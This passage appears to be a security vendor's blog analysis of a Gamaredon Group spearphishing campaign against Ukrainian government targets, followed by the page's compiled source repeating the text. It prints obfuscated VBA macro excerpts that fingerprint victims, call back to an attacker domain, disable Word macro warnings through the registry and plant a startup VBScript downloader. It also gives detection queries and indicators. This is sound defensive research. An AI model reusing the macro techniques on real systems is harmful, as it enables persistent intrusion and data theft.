automation around updating a name server in the Domain Name System (DNS). By adopting this technique, this shows the adversary’s attempt to mask their ownership and obscure atomic indicator associations through the use of transient infrastructures, such as Dynamic DNS.\n\n![](/assets/images/playing-defense-against-gamaredon-group/template_download.jpg)\n\n_Figure 5 - Word startup screen showing download of remote document template_\n\nThe remote templates are macro-enabled, configured to execute VBA macro code that persists a VBScript object in the victim’s startup folder as a foothold. We assess the objective of this initial code is used to identify the victim and to protect the second-stage payload that is intended only for their targeted victims. In the next sections, we will review the document’s metadata and macro code found in a recent [sample](https://www.virustotal.com/gui/file/feb0596e9735e03ae929d9b5ee862da19e16e5cdf57dd2a795205e591a55940f/details).\n\n## Document metadata analysis\n\nIn malicious campaigns, infrastructure is commonly created for specific targets. This serves multiple purposes, but frequently it’s done to track implants and frustrate automated research and analysis. As analysts, this gives us some insight into the adversaries’ maturity, experience, and resources. As an example, an adversary who reuses lure documents or templates may be less experienced, not interested in high-value targets, or using monetized infrastructure from previous campaigns.\n\nAnalyzing the metadata from the lure document and template allows us to see when these weaponized documents were created, as well as identify any associations between different elements of the campaign.\n\nAs we can see in Figure 6, the lure document was created on December 24, 2019 by the Author “ШУРИК”. In Figure 7, we can see that the Author is the same as observed in the lure document (ШУРИК). Additionally, we can see that the remote template was created on December 12, 2019 and then modified on December 24, 2019. There were 5 modifications to it, indicating that it has been used for 5 campaigns in 12 days — or about 2.5 days per campaign. With moderate confidence, this tells us that the remote template is likely reused and updated with new macros for new campaigns, and that they were created by the same Author (or at a minimum, the same instance of Microsoft Word).\n\nAs an analyst note, we see different tool markings that indicate this was created by a Russian speaker (Russian Author, Russian Language Code, Cyrillic character set, and the usage of Reanimator Extreme Edition). While we can use those as information to help inform overall analysis, this information can be seeded — so it doesn’t prove anything definitively on its own. In this case, this aligns with other open source analysis linking this to the Gamaredon Group, which is believed to be Russian in origin.\n\n|                        |                                                                         |\n| ---------------------- | ----------------------------------------------------------------------- |\n| File Size              | 46 kB                                                                   |\n| File Type Extension    | docx                                                                    |\n| MIME Type              | application/vnd.openxmlformats-officedocument.wordprocessingml.document |\n| Last Modified By       | ШУРИК                                                                   |\n| Revision Number        | 2                                                                       |\n| Create Date            | 2019:12:24 15:58:00Z                                                    |\n| Modify Date            | 2019:12:24 16:10:00Z                                                    |\n| Template               | pos.dot                                                                 |\n| Total Edit Time        | 2 minutes                                                               |\n| Pages                  | 1                                                                       |\n| Words                  | 195                                                                     |\n| Characters             | 1114                                                                    |\n| Application            | Microsoft Office Word                                                   |\n| Lines                  | 9                                                                       |\n| Paragraphs             | 2                                                                       |\n| Company                | Reanimator Extreme Edition                                              |\n| Characters With Spaces | 1307                                                                    |\n\n_Figure 6 - Metadata from the lure document (truncated for length)_\n\n|                        |                            |\n| ---------------------- | -------------------------- |\n| File Size              | 44 kB                      |\n| File Type Extension    | doc                        |\n| MIME Type              | application/msword         |\n| Language Code          | Russian                    |\n| Author                 | ШУРИК                      |\n| Template               | pos.dot                    |\n| Last Modified By       | ШУРИК                      |\n| Software               | Microsoft Office Word      |\n| Create Date            | 2019:12:12 11:48:00        |\n| Modify Date            | 2019:12:24 10:30:00        |\n| Code Page              | Windows Cyrillic           |\n| Company                | Reanimator Extreme Edition |\n| Char Count With Spaces | 0                          |\n| Revision Number        | 5                          |\n| Total Edit Time        | 0                          |\n| Words                  | 0                          |\n| Characters             | 0                          |\n| Pages                  | 1                          |\n| Paragraphs             | 1                          |\n| Lines                  | 1                          |\n\n_Figure 7 - Metadata from the remote template (truncated for length)_\n\nWhile we cannot state with any authority, searching for the Author “ШУРИК” has identified similar TTPs (lure documents with remote template injection) as far back as September of 2019.\n\n## Macro code analysis\n\nThe macro code was obfuscated using string concatenation and procedurally generated variables — techniques that are often used to bypass static detection technologies. Upon execution, this code provides reverse shell functionality that allows an adversary access to the victim’s system and capability to access shared resources on their local network. Figure 8 contains an excerpt of the macro that depicts the creation of a reverse shell and some of the system information collected automatically.\n\n```\nDim NoARzTHy\nNoARzTHy = \"Set WShell=CreateObject(\"\"WSc\" + \"ri\" + \"pt.S\" + \"hel\" + \"l\"\")\"\nSet PWFJWatF = CreateObject(\"WScr\" + \"ipt.Ne\" + \"two\" + \"rk\")\nDim pbuvwTLK, JzESywut\nSet GGZucIZE = CreateObject(\"Sc\" + \"rip\" + \"ting.Fi\" + \"leSy\" + \"stemOb\" + \"ject\")\npbuvwTLK = GGZucIZE.Drives(Environ(\"Syst\" + \"emDri\" + \"ve\")).SerialNumber\nOYTgBXAP = PWFJWatF.ComputerName\n```\n\n_Figure 8 - First 7 lines of macro code from the loaded document template_\n\nFigure 9 shows an excerpt of the same code removing the concatenation.\n\n```\nDim NoARzTHy\nNoARzTHy = \"Set WShell=CreateObject(\"WScript.Shell\")\"\nSet PWFJWatF = CreateObject(\"WScript.Network\")\nDim pbuvwTLK, JzESywut\nSet GGZucIZE = CreateObject(\"Scripting.FileSystemObject\")\npbuvwTLK = GGZucIZE.Drives(Environ(\"SystemDrive\")).SerialNumber\nOYTgBXAP = PWFJWatF.ComputerName\n```\n\n_Figure 9 - First 7 lines of macro code - Removal of concatenation_\n\nThe serial number and hostname of the victim's computer are some of the first pieces of information the VBA collects. They are converted to hexadecimal and included in the reverse shell HTTP request to identify both the implant and the victim. Figure 10 shows off the configuration of the URI request within the macro and Figure 11 represents an example URI.\n\n```\nJzESywut = \"h\" + \"tt\" + \"p:\" + \"//l\" + \"ibcr\" + \"ash.dd\" + \"ns.ne\" + \"t/\" \u0026 OYTgBXAP \u0026 \"_\" \u0026 HFzesifc \u0026 \"//po\" + \"sol\" + \"re\" + \"boo\" + \"t.ph\" + \"p\"\n```\n\n_Figure 10 - URI request configuration - Macro_\n\n```\nJzESywut = hxxp://libcrash.ddns[.]net/ENDPOINT1_96L02G3D//posolreboot.php\n```\n\n_Figure 11 - URI request configuration - Example_\n\nBy default, Microsoft disables external or untrusted macros by setting key values in the registry at HKCU\\Software\\Microsoft\\Office\\(VERSION)\\Word\\Security\\. The first registry modification made by this macro changes the key value of AccessVBOM to 1, effectively bypassing the default setting to enable external or untrusted macros. The second registry modification enables all macros automatically and disables warnings for future macro-enabled objects. Figure 12 represents the macro code for these registry modifications.\n\n```\nFEDzCjgi$ = \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\" \u0026 Application.Version \u0026 _\"\\Word\\Security\\\"\nCreateObject(\"WScript.Shell\").RegWrite FEDzCjgi$ \u0026 \"AccessVBOM\", 1, \"REG_DWORD\"\nCreateObject(\"WScript.Shell\").RegWrite FEDzCjgi$ \u0026 \"VBAWarnings\", 1, \"REG_DWORD\"\n```\n\n_Figure 12 - Registry modifications found in macro_\n\nThe remaining lines of code end up writing a VBScript file and placing it in the user’s startup directory. Figure 13 contains an excerpt of the beginning lines of macro code where the VBScript (security.vbs) is written to disk and placed in the startup folder.\n\n```\nDim LISPVdZd As Object\nSet LISPVdZd = GGZucIZE.CreateTextFile(FESHWDaD + \"\\Mi\" + \"croso\" + \"ft\\Wi\" + \"ndow\" + \"s\\St\" + \"art Men\" + \"u\\Pro\" + \"grams\\Sta\" + \"rtup\\secur\" + \"ity.v\" + \"b\" + \"s\", True, True)\n```\n\n_Figure 13 - Macro code writing VBScript file (security.vbs)_\n\nUpon rebooting or successfully authenticating to an infected system, the persistent VBScript file is automatically executed and a standard HTTP GET is made with the previously observed URI (Figure 14). If the request is successful, the response body gets stored into another variable. This functionality appears to serve as a downloader that has specific subroutine instructions for reassembling a binary on disk. Figure 14 contains an excerpt of the function used to construct the HTTP GET request.\n\n```\nFunction TOGeMFBD(iWotBBKf)\nOn Error Resume Next\nSet EXJJrRlN = CreateObject(\"MSXML2.XMLHTTP\")\nWith EXJJrRlN\n.Open \"GET\", iWotBBKf, False\n.send\nEnd With\nIf EXJJrRlN.Status = 200 Then\nTOGeMFBD = EXJJrRlN.ResponseBody\nEnd If\nEnd Function\n```\n\n_Figure 14 - GET request (security.vbs)_\n\nDuring dynamic analysis, analysts identified that the script enters a loop while sending the request. A 0-byte file is created under the infected user’s roaming profile with a procedurally generated file name and text file extension. The file is iteratively written and deleted without the contents changing.\n\nAnalysts have not confirmed the purpose of this file, and suspect it is used to reassemble a segmented later-stage implant. Potential reasons to obfuscate this process include evading detection and response solutions.\n\n## Pteranodon update\n\nWhile doing this research, we observed samples and artifacts that appear to be related to an updated version of the Gamaredon Group’s custom backdoor, known as [Pteranodon](https://attack.mitre.org/software/S0147/). Although we don’t have substantial evidence that Pteranodon is the final payload victims are infected with during this campaign, we assess with moderate confidence that this activity is linked to Gamaredon Group.\n\nThree PE samples were uploaded to VirusTotal last month with each dropping two text files ([ExcelMyMacros.vba](https://www.virustotal.com/gui/file/c4089686965df5e52105b6eac06703aa11c4891695278446370f623d531b505e/details), [wordMacros.vba](https://www.virustotal.com/gui/file/02e6e2bfaaf6e77cfaccadaf26167135c53cf2c934d17c5a83e5bbcadd85b47d/details)). The two text files share several similarities to the VBA macro code found in the remote templates used in this campaign — specifically, the methods of retrieving and hex-encoding the serial number and similar subroutine logic. Figure 15 depicts the VBA macro code from the remote template on the left and the dropped VBA macro code from a known Pteranodon implant on the right.\n\n**VBA from Campaign**\n\n```\nFor LfJesrvH = 0 To UBound( IvAPFGDD )\" + vbCrLf\nLISPVdZd.Write \"IvAPFGDD(LfJesrvH) = Asc( Mid( EaCJFwPc, LfJesrvH + 1, 1 ) )\" + vbCrLf\nLISPVdZd.Write \"Next\" + vbCrLf\nLISPVdZd.Write \"GetFEDzCjgi = IvAPFGDD\" + vbCrLf\n```\n\n**VBA from Pteranodon**\n\n```\nFor i = 0 To UBound( asrrCodes )\" + vbCrLf\nNewVDJKpCBSFile.Write \" asrrCodes(i) = Asc( Mid( myPassPhrase, i + 1, 1 ) )\" + vbCrLf\nNewVDJKpCBSFile.Write \" Next\" + vbCrLf\nNewVDJKpCBSFile.Write \" GetKey = asrrCodes\" + vbCrLf\n```\n\n_Figure 15 - Macro comparison - VBA from Campaign (top) vs VBA from Pteranodon (bottom)_\n\nBoth text files contained VBA, and had the same functionality for disabling macro warnings, creating a persistent VBScript in the startup folder and establishing connections to C2. What’s interesting with the dropped text files (VBA), is that they show the true variable names used by the developers before their tooling obfuscates the variables. At the time of this writing, each of the four C2 servers (see attached indicators) affiliated with Pteranodon samples were currently active and hosted a network allocated to ASN9123 (TIMEWEB LTD). Macro code associated with the Gamaredon Group campaign targeting Ukraninan officials called back to C2 hosted in the same network.\n\nAn interesting change in some of these artifacts appears to be the adoption of .NET. Along with the two text files containing VBA code, there are three dropped DLL’s (Microsoft.Office.Interop.Excel.dll, Microsoft.Office.Interop.Word.dll, Microsoft.Vbe.Interop.dll) and a .NET [sample](https://www.virustotal.com/gui/file/145a61a14ec6d32b105a6279cd943317b41f1d27f21ac64df61bcdd464868edd/details) showing dependencies with these files. Figure 16 shows a hex-encoded reference to one of the VBA files (wordMacros.txt). Based on these observations, it’s intriguing to see Gamaredon Group continue to leverage core functionality of their VBA stager code, but in a new method of execution by using .NET\n\n![](/assets/images/playing-defense-against-gamaredon-group/dotnet_reference.jpg)\n\n_Figure 16 - .NET reference to “wordMacros.txt”_\n\n## Detection crafting\n\nFor organizations interested in detecting TTPs discussed in this blog post, detection logic has been provided for the following categories:\n\n### Dynamic DNS\n\n[Dynamic DNS](https://attack.mitre.org/techniques/T1311/) enables adversaries to rapidly provision very large numbers of records that map back to their infrastructure, creating a confusion layer between victims and adversaries. Gamaredon Group exclusively used Dynamic DNS locations for remotely hosted templates, rotating domains consistently, and leveraging separate infrastructure for hosting stagers and templates.\n\nProfiling Dynamic DNS for your enterprise is an amazing way to get started hunting — not just to baseline and build environmental awareness, but also to outright find evil. We will primarily focus on the two Dynamic DNS providers observed in relation to this campaign. If you need inspiration, consider counting up all non-browser processes that made a DNS request to one of these Dynamic DNS providers as shown in Figure 17.\n\n```\ndns where wildcard(query_name, \"*.ddns.net\", \"*.hopto.org\", \"*.bounceme.net\") and\nprocess_name not in (\"chrome.exe\",\"iexplore.exe\", \"firefox.exe\")\n| count process_name, query_name\n```\n\n_Figure 17 - EQL Query - Count of non-browser process to dynamic DNS providers_\n\nAnother option examines the processes that most frequently communicate with these providers, and may provide more context regarding how dynamic DNS is used in your environment, or enable an analyst to find signs of other malicious activity.\n\n```\nnetwork where event of\n[dns where wildcard(query_name, \"*.ddns.net\", \"*.hopto.org\", \"*.bounceme.net\")\n| count process_name, total_in_bytes, total_out_bytes\n```\n\n_Figure 18 - EQL query - Network traffic of processes to dynamic DNS providers_\n\n### Template Injection\n\nSpearphishing attachments that utilize [template injection](https://attack.mitre.org/techniques/T1221/) may bypass security controls because they contain no embedded VBA code. The attached document retrieves a remotely hosted template where the malicious VBA code resides. In order to detect this activity dynamically, analyze DNS and network traffic over common protocols (HTTP/HTTPS/SMB) and processes generated by Microsoft Office applications. Enterprise defenders may need to whitelist any legitimate use of remotely hosted templates, or any benign network activity to Microsoft infrastructure. Below is an example EQL query focused on new process creation events from Office products that also made DNS requests outside our whitelist.\n\n```\nsequence by unique_pid\n[process where process_name in (\"winword.exe\", \"excel.exe\", \"powerpnt.exe\")]\n[dns where not wildcard(query_name , \"*.microsoft.com\", \"*.skype.com\")]\n```\n\n_Figure 19 - EQL query - DNS traffic from Office applications_\n\nSome enhancements we can use with the previous query is to add a network event to the sequence as well as look for a spawned child process bringing in more context to the detection.\n\n```\nsequence\n[process where process_name in (\"winword.exe\", \"excel.exe\", \"powerpnt.exe\")] by unique_pid\n[dns where not wildcard(query_name, \"*.microsoft.com\", \"*.skype.com\")] by unique_pid\n[network where true] by unique_pid\n[process where subtype.create] by unique_ppid\n```\n\n_Figure 20 - EQL query - Network traffic making dynamic DNS requests from Office applications_\n\nIf we wanted to tailor a sequence-based detection to the Gamaredon Group activity specifically, we can bring in the previous Dynamic DNS providers, which creates a more restrictive filter.\n\n```\nsequence by unique_pid\n[process where process_name in (\"winword.exe\", \"excel.exe\", \"powerpnt.exe\")]\n[network where event of\n[dns where wildcard(query_name, \"*.ddns.net\", \"*.hopto.org\", \"*.bounceme.net\")]]\n```\n\n_Figure 21 - EQL query - Network traffic making dynamic DNS requests from Office applications_\n\nAcross a range of features provided by the Elastic Endpoint, this attack is prevented through different machine-learning technologies to stop advanced threats such as macro-enabled documents and malicious binaries. Along with these protections, we can take nearly any EQL logic and deploy it in prevention mode to completely stop an attack such as in this example with the download and execution of the remote template. Here’s a short clip in action:\n\n\u003cVideo vidyard_uuid=\"Ex2QdtBA8eaHYQFDMK8wWR\" /\u003e\n\n### Malicious registry configuration\n\nIn order for adversaries to be effective in their mission, they often create their own opportunities. In this case, the adversary reconfigured the target endpoint in order to disable macro security warnings and trust future macros automatically. These small changes can end up having larger implications, and defenders can look for them as symptoms of more serious security issues. For example, these same techniques have also been associated with threat groups like APT32 and are leveraged by malware families such as [AgentTesla](https://www.fortinet.com/blog/threat-research/in-depth-analysis-of-net-malware-javaupdtr.html) and [BabyShark](https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/).\n\nThis query looks for evidence of the registry modifications that disable warnings for macros and automatically enabling future macros:\n\n```\nregistry where registry_data == 1 and wildcard(registry_path,\n\"*\\\\Software\\\\Microsoft\\\\Office\\\\*\\\\Word\\\\Security\\\\AccessVBOM\",\n\"*\\\\Software\\\\Microsoft\\\\Office\\\\*\\\\Word\\\\Security\\\\VBAWarnings\")\n```\n\n_Figure 22 - EQL query - Registry modifications around disabling macro security features_\n\nThat would function perfectly well as a standalone detection, but EQL allows us to look for both the registry modification and template injection techniques in this example query:\n\n```\nsequence by unique_pid\n[process where process_name in (\"winword.exe\", \"excel.exe\", \"powerpnt.exe\")]\n[registry where registry_data == 1 and wildcard(registry_path,\n\"*\\\\Software\\\\Microsoft\\\\Office\\\\*\\\\Word\\\\Security\\\\AccessVBOM\",\n\"*\\\\Software\\\\Microsoft\\\\Office\\\\*\\\\Word\\\\Security\\\\VBAWarnings\")]\n[registry where registry_data == 1 and wildcard(registry_path,\n\"*\\\\Software\\\\Microsoft\\\\Office\\\\*\\\\Word\\\\Security\\\\AccessVBOM\",\n\"*\\\\Software\\\\Microsoft\\\\Office\\\\*\\\\Word\\\\Security\\\\VBAWarnings\")]\n```\n\n_Figure 23 - EQL query - Registry modifications around disabling macro security features_\n\n### Persistence startup\n\nGamaredon Group leveraged both malicious Windows shortcut files and script objects written to the [Startup folder](https://attack.mitre.org/techniques/T1060/) for persistence. This technique is very effective in spite of its simplicity and continues to be popular among adversaries. One of the first places to start building detection logic would be to inquire about processes that write files to the startup folder.\n\n```\nfile where subtype.create\nand (\nfile_path == \"*\\\\Programs\\\\Startup\\\\*.lnk\" or\nfile_path == \"*\\\\Programs\\\\Startup\\\\*.vbs\"\n)\n| count process_name, file_path, user_name\n```\n\n_Figure 24 - EQL query - Monitoring file writes to startup folder_\n\nTo take it a bit further, we can also customize detection logic to include the VBScript execution at logon. This is a great example for building a sequenced-based signal, as we will track the adversary’s activity over an extended period of time — such as 90 days. Once the machine is rebooted or the user logs back in, an alert can be generated when WScript executes the VBScript file at startup.\n\n```\nsequence with maxspan=90d\n[file where subtype.create and file_path == \"*\\\\Programs\\\\Startup\\\\*.vbs\"]\n[process where subtype.create and parent_process_name==\"explorer.exe\" and\nprocess_name == “wscript.exe” and command_line == \"*\\\\Programs\\\\Startup\\\\*\"]\n```\n\n_Figure 25 - EQL query - Monitoring execution of startup processes_\n\n## Conclusion\n\nIn this post, we reviewed recent campaign TTPs tied to an adversary known publicly as Gamaredon Group. This group is likely to have been active since at least 2013 and has engaged in an ongoing campaign against Ukraine at the time of this writing. We highlighted some of their current techniques such as template injection and the use of Dynamic DNS providers, the macro code found in a recent sample, and updates to their custom backdoor known as Pteranodon. By using [EQL](https://www.elastic.co/blog/introducing-event-query-language), we also shared hunting and detection strategies around four specific techniques used by Gamaredon Group.\n\nWe hope that by sharing some of these insights and queries, we can help raise awareness and continue to focus on protecting the world's data from attacks. To enable organizations further, we’ve added all the Indicators of Compromise (IOCs) below and added the queries in this post into the [EQLLib repository](https://eqllib.readthedocs.io/en/latest/analytics.html).\n\nInterested in using Elastic Security? Try [Elastic SIEM](https://www.elastic.co/siem) for free.\n\nPlus, [EQL support is being added to Elasticsearch](https://github.com/elastic/elasticsearch/issues/49581)!\n\n## Indicators of Compromise (IOCs)\n\n|                                           |                                                                    |\n| ----------------------------------------- | ------------------------------------------------------------------ |\n| Lure Document SHA-256                     | 86e0701349903105b0c346df9485dd59d85dd9463c2bee46d974ea1b1d7059d4   |\n| Remote Template (pos.dot) SHA-256         | feb0596e9735e03ae929d9b5ee862da19e16e5cdf57dd2a795205e591a55940f   |\n| Remote Template from Lure Document Domain | document-out[.]hopto[.]org/pos[.]dot                               |\n| Remote Template Hosting IP                | 141[.]8[.]195[.]60                                                 |\n| Remote Template Hosting IP                | 141[.]8[.]192[.]153                                                |\n| System Information Upload IP              | 188[.]225[.]25[.]50                                                |\n| System Information Upload URI             | libcrash.ddns[.]net/\\{Computername_SerialNumber\\}//posolreboot.php |\n| ExcelMyMacros.vba SHA-256                 | c4089686965df5e52105b6eac06703aa11c4891695278446370f623d531b505e   |\n| wordMacros.vba SHA-256                    | 02e6e2bfaaf6e77cfaccadaf26167135c53cf2c934d17c5a83e5bbcadd85b47d   |\n| ExcelMyMacros.txt SHA-256                 | 2f310c5b16620d9f6e5d93db52607f21040b4829aa6110e22ac55fab659e9fa1   |\n| Pteranodon SHA-256                        | c1524a4573bc6acbe59e559c2596975c657ae6bbc0b64f943fffca663b98a95f   |\n| Pteranodon SHA-256                        | 145a61a14ec6d32b105a6279cd943317b41f1d27f21ac64df61bcdd464868edd   |\n| Pteranodon Domain                         | beercraft[.]space                                                  |\n| Pteranodon Domain                         | skymage[.]fun                                                      |\n| Pteranodon Domain                         | masseffect[.]space                                                 |\n| Pteranodon Domain                         | masseffect[.]website                                               |\n| Pteranodon IP                             | 185[.]200[.]241[.]88                                               |\n| Pteranodon IP                             | 188[.]225[.]46[.]94                                                |\n\n## References\n\n1. [https://www.anomali.com/resources/whitepapers/malicious-activity-aligning-with-gamaredon-ttps-targets-ukraine](https://www.anomali.com/resources/whitepapers/malicious-activity-aligning-with-gamaredon-ttps-targets-ukraine)\n","code":"var Component=(()=\u003e{var h=Object.create;var a=Object.defineProperty;var p=Object.getOwnPropertyDescriptor;var u=Object.getOwnPropertyNames;var m=Object.getPrototypeOf,f=Object.prototype.hasOwnProperty;var g=(n,e)=\u003e()=\u003e(e||n((e={exports:{}}).exports,e),e.exports),w=(n,e)=\u003e{for(var i in e)a(n,i,{get:e[i],enumerable:!0})},s=(n,e,i,o)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let r of u(e))!f.call(n,r)\u0026\u0026r!==i\u0026\u0026a(n,r,{get:()=\u003ee[r],enumerable:!(o=p(e,r))||o.enumerable});return n};var y=(n,e,i)=\u003e(i=n!=null?h(m(n)):{},s(e||!n||!n.__esModule?a(i,\"default\",{value:n,enumerable:!0}):i,n)),b=n=\u003es(a({},\"__esModule\",{value:!0}),n);var c=g((k,d)=\u003e{d.exports=_jsx_runtime});var D={};w(D,{default:()=\u003eT,frontmatter:()=\u003ev});var t=y(c()),v={title:\"Playing defense against Gamaredon Group\",slug:\"playing-defense-against-gamaredon-group\",date:\"2022-06-21\",description:\"Learn about the recent campaign of a Russia-based threat group known as Gamaredon Group.  This post will review these details and provide detection strategies.\",author:[{slug:\"daniel-stepanic\"},{slug:\"andrew-pease\"},{slug:\"seth-goodwin\"},{slug:\"elastic-security-intelligence-analytics-team\"}],image:\"blog-thumb-digital-shield.jpg\",category:[{slug:\"activity-group\"}]};function l(n){let e=Object.assign({p:\"p\",a:\"a\",h2:\"h2\",img:\"img\",em:\"em\",div:\"div\",table:\"table\",thead:\"thead\",tr:\"tr\",th:\"th\",tbody:\"tbody\",td:\"td\",pre:\"pre\",code:\"code\",strong:\"strong\",h3:\"h3\",ol:\"ol\",li:\"li\"},n.components),{Video:i}=e;return i||x(\"Video\",!0),(0,t.jsxs)(t.Fragment,{children:[(0,t.jsxs)(e.p,{children:[\"For several months, the Intelligence \u0026 Analytics team at Elastic Security has tracked an ongoing adversary campaign appearing to target Ukranian government officials. Based on our monitoring, we believe \",(0,t.jsx)(e.a,{href:\"https://attack.mitre.org/groups/G0047/\",rel:\"nofollow\",children:\"Gamaredon Group\"}),\", a suspected Russia-based threat group, is behind this campaign. Our observations suggest a significant overlap between tactics, techniques, and procedures (TTPs) included within this campaign and \",(0,t.jsx)(e.a,{href:\"https://www.anomali.com/resources/whitepapers/malicious-activity-aligning-with-gamaredon-ttps-targets-ukraine\",rel:\"nofollow\",children:\"public reporting\"}),(0,t.jsx)(\"sup\",{children:\"1\"}),\".\"]}),`\n`,(0,t.jsx)(e.p,{children:\"This campaign has produced and deployed updated lures on a near-daily basis that appear to target multiple Ukrainian government departments. With this high operational tempo and aggressive targeting, they consistently employ a cluster of initial access techniques and procedures. Over the past four months, these techniques have consisted of spearphishing, remote document template injection, startup folder persistence, VBA/VBScript languages, and Dynamic DNS command \u0026 control infrastructure.\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"In this post, we\\u2019ll walk through the campaign details, reviewing the implementation while also providing solutions such as detection strategies through the use of Elastic\\u2019s \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/blog/introducing-event-query-language\",rel:\"nofollow\",children:\"Event Query Language (EQL)\"}),\".\"]}),`\n`,(0,t.jsx)(e.h2,{id:\"campaign-details\",children:\"Campaign Details\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"The earliest identified \",(0,t.jsx)(e.a,{href:\"https://www.virustotal.com/gui/domain/libre-templates.ddns.net/details\",rel:\"nofollow\",children:\"infrastructure\"}),\" indicates this campaign has been active since August 2019. The first \",(0,t.jsx)(e.a,{href:\"https://www.virustotal.com/gui/file/481eee236eadf6c947857820d3af5a397caeb8c45791f0bbdd8a21f080786e75/details\",rel:\"nofollow\",children:\"sample\"}),\" leveraging this domain was submitted to VirusTotal in early September 2019. Spearphishing emails like the example in Figure 1 (below) were used to deliver a malicious attachment and demonstrate Gamaredon Group\\u2019s attempt to impersonate an anti-corruption activist. This example targeted the National Security and Defense Council of Ukraine and dates to January 17, 2020.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/playing-defense-against-gamaredon-group/email_redact1.png\",alt:\"\",width:\"1027\",height:\"687\"})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 1 - Spearphishing email sent to National Security and Defense Council of Ukraine\"})}),`\n`,(0,t.jsx)(e.p,{children:\"A typical lure document might masquerade as an information request to the Ministry of Foreign Affairs of Ukraine. These manufactured lures included official logos stolen from governmental offices of Ukraine and impersonated diplomats known to their targets.\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/playing-defense-against-gamaredon-group/lure1.png\",alt:\"\",width:\"648\",height:\"516\"})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 2 - Lure document - Ministry of Foreign Affairs in Ukraine request\"})}),`\n`,(0,t.jsx)(e.p,{children:\"To improve their chances of success, they customize the request around the same date of the campaign and include urgent requests for action. These efforts are indicative of necessity.\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/playing-defense-against-gamaredon-group/lure2.jpg\",alt:\"\",width:\"791\",height:\"606\"})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 3 - Lure document - Information request related to NSDC Head of Ukraine\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"Often, the call to action first required the victim to open an attached lure document. A user who attempted to open one of these malicious attachments would see a perfectly convincing decoy document, while a sequence of invisible actions occurred behind the screen. These documents end up leveraging a technique known as \",(0,t.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1221/\",rel:\"nofollow\",children:\"template injection\"}),\", a method of loading remotely hosted Microsoft Word document templates.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"Microsoft Word objects function similarly to compressed archives and have properties defined using Microsoft\\u2019s Open Office XML (OOXML) format. Within the decompressed word/_rels/ subdirectory, the file settings.xml.rels contained a network location where a remotely hosted template was retrieved as depicted in Figure 4.\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/playing-defense-against-gamaredon-group/template1.jpg\",alt:\"\",width:\"1078\",height:\"83\"})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 4 - Excerpt from Settings.xml.rels\"})}),`\n`,(0,t.jsx)(e.p,{children:\"Each external URL within these lures were configured to point to Dynamic DNS providers (ddns.net, hopto.org). Dynamic DNS provides automation around updating a name server in the Domain Name System (DNS). By adopting this technique, this shows the adversary\\u2019s attempt to mask their ownership and obscure atomic indicator associations through the use of transient infrastructures, such as Dynamic DNS.\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/playing-defense-against-gamaredon-group/template_download.jpg\",alt:\"\",width:\"603\",height:\"339\"})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 5 - Word startup screen showing download of remote document template\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"The remote templates are macro-enabled, configured to execute VBA macro code that persists a VBScript object in the victim\\u2019s startup folder as a foothold. We assess the objective of this initial code is used to identify the victim and to protect the second-stage payload that is intended only for their targeted victims. In the next sections, we will review the document\\u2019s metadata and macro code found in a recent \",(0,t.jsx)(e.a,{href:\"https://www.virustotal.com/gui/file/feb0596e9735e03ae929d9b5ee862da19e16e5cdf57dd2a795205e591a55940f/details\",rel:\"nofollow\",children:\"sample\"}),\".\"]}),`\n`,(0,t.jsx)(e.h2,{id:\"document-metadata-analysis\",children:\"Document metadata analysis\"}),`\n`,(0,t.jsx)(e.p,{children:\"In malicious campaigns, infrastructure is commonly created for specific targets. This serves multiple purposes, but frequently it\\u2019s done to track implants and frustrate automated research and analysis. As analysts, this gives us some insight into the adversaries\\u2019 maturity, experience, and resources. As an example, an adversary who reuses lure documents or templates may be less experienced, not interested in high-value targets, or using monetized infrastructure from previous campaigns.\"}),`\n`,(0,t.jsx)(e.p,{children:\"Analyzing the metadata from the lure document and template allows us to see when these weaponized documents were created, as well as identify any associations between different elements of the campaign.\"}),`\n`,(0,t.jsx)(e.p,{children:\"As we can see in Figure 6, the lure document was created on December 24, 2019 by the Author \\u201C\\u0428\\u0423\\u0420\\u0418\\u041A\\u201D. In Figure 7, we can see that the Author is the same as observed in the lure document (\\u0428\\u0423\\u0420\\u0418\\u041A). Additionally, we can see that the remote template was created on December 12, 2019 and then modified on December 24, 2019. There were 5 modifications to it, indicating that it has been used for 5 campaigns in 12 days \\u2014 or about 2.5 days per campaign. With moderate confidence, this tells us that the remote template is likely reused and updated with new macros for new campaigns, and that they were created by the same Author (or at a minimum, the same instance of Microsoft Word).\"}),`\n`,(0,t.jsx)(e.p,{children:\"As an analyst note, we see different tool markings that indicate this was created by a Russian speaker (Russian Author, Russian Language Code, Cyrillic character set, and the usage of Reanimator Extreme Edition). While we can use those as information to help inform overall analysis, this information can be seeded \\u2014 so it doesn\\u2019t prove anything definitively on its own. In this case, this aligns with other open source analysis linking this to the Gamaredon Group, which is believed to be Russian in 